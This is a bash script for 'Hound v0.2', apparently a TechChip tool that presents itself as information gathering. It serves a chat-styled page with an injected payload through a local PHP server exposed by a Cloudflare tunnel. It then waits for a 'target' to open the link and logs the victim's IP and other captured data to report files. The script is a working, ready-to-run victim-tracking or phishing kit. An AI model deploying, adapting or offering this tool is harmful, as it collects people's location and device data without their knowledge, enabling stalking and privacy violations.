#!/bin/bash
# Hound v 0.2
# Powered by TechChip
# visit https://youtube.com/techchipnet

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n'
printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
printf " \e[1;93m      Hound Ver 0.2 - by Anil Parashar [TechChip]\e[0m\n"
printf " \e[1;92m      www.techchip.net | youtube.com/techchipnet \e[0m\n"
printf "\e[1;90m Hound is a simple and light tool for information gathering.\e[0m\n\n"
}

dependencies() {
    for cmd in php wget; do
        command -v $cmd > /dev/null 2>&1 || { echo >&2 "I require $cmd but it's not installed. Install it and retry."; exit 1; }
    done
}

stop() {
    killall -2 php > /dev/null 2>&1
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 ssh > /dev/null 2>&1
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[+] IP: \e[0m\e[1;77m%s\e[0m\n" "$ip"
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n\e[1;92m[*] Waiting for target interaction...\e[0m\n"
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[+] Target opened the link!\e[0m\n"
            catch_ip
            rm -rf ip.txt
            tail -f -n 110 data.txt
        fi
        sleep 0.5
    done
}

cf_server() {
    if [[ ! -e cloudflared ]]; then
        printf "\e[1;92m[+] Downloading Cloudflared...\e[0m\n"
        arch=$(uname -m)
        if [[ $arch == *'arm'* ]]; then
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
        elif [[ $arch == *'aarch64'* ]]; then
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        elif [[ $arch == *'x86_64'* ]]; then
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        else
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
        fi
        chmod +x cloudflared
    fi

    printf "\e[1;92m[+] Starting PHP server on port 3333...\e[0m\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2

    printf "\e[1;92m[+] Starting Cloudflared tunnel...\e[0m\n"
    ./cloudflared tunnel --url http://127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
    sleep 10

    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cf.log | head -n 1)

    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Failed to get tunnel URL.\e[0m\n"
        stop
    else
        printf "\e[1;92m[+] Public URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
    fi

    sed 's+forwarding_link+'$link'+g' template.php > index.php
    checkfound
}

local_server() {
    sed 's+forwarding_link+''+g' template.php > index.php
    printf "\e[1;92m[+] Starting PHP server on localhost:8080...\e[0m\n"
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    sleep 2
    checkfound
}

hound() {
    [[ -e data.txt ]] && cat data.txt >> targetreport.txt && rm -rf data.txt && touch data.txt
    [[ -e ip.txt ]] && rm -rf ip.txt
    sed -e '/tc_payload/r payload' index_chat.html > index.html

    read -p $'\n\e[1;93m Do you want to use Cloudflared tunnel? [Y/n]: \e[0m' option
    option="${option:-Y}"

    if [[ $option == [Yy] ]]; then
        cf_server
    else
        local_server
    fi
}

banner
dependencies
hound
